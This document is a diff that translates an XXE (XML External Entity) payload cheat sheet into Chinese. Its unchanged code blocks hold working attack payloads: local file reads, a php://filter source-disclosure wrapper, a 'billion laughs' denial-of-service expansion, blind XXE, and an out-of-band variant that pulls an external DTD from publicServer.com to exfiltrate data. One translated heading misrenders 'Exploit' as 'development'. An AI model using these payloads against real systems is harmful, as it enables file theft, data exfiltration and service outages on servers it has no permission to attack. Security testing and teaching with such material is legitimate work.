@@ -1,9 +1,9 @@
-# XML External Entity
-An XML External Entity attack is a type of attack against an application that parses XML input	
+# XML外部实体
+XML外部实体攻击是针对解析XML输入的应用程序的一种攻击类型。
 
-## Exploit
+## 开发
 
-Basic Test
+基础测试
 ```
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
@@ -13,7 +13,7 @@ Basic Test
  </userInfo>
 ```
 
-Classic XXE
+经典 XXE
 ```
 <?xml version="1.0"?>
 <!DOCTYPE data [
@@ -23,12 +23,12 @@ Classic XXE
 <data>&file;</data>
 ```
 
-Classic XXE Base64 encoded
+Base64编码的经典XXE
 ```
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,PCFF...Cg=="> %init; ]><foo/>
 ```
 
-PHP Wrapper inside XXE
+XXE内部的PHP包装
 ```
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <contacts>
@@ -43,7 +43,7 @@ PHP Wrapper inside XXE
 ```
 
 
-Deny Of Service - Billion Laugh Attack
+拒绝服务 - 10亿人的笑声攻击（Billion Laugh Attack）
 ```
 <!DOCTYPE data [
 <!ENTITY a0 "dos" >
@@ -55,7 +55,7 @@ Deny Of Service - Billion Laugh Attack
 <data>&a4;</data>
 ```
 
-Blind XXE
+盲注 XXE
 ```
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
@@ -68,7 +68,7 @@ Blind XXE
 ```
 
 
-XXE OOB Attack (Yunusov, 2013)
+XXE OOB 攻击 (Yunusov, 2013)
 ```
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
@@ -81,6 +81,6 @@ File stored on http://publicServer.com/parameterEntity_oob.dtd
 ```
 
 
-## Thanks to
+## 致谢
 * https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
 * http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html
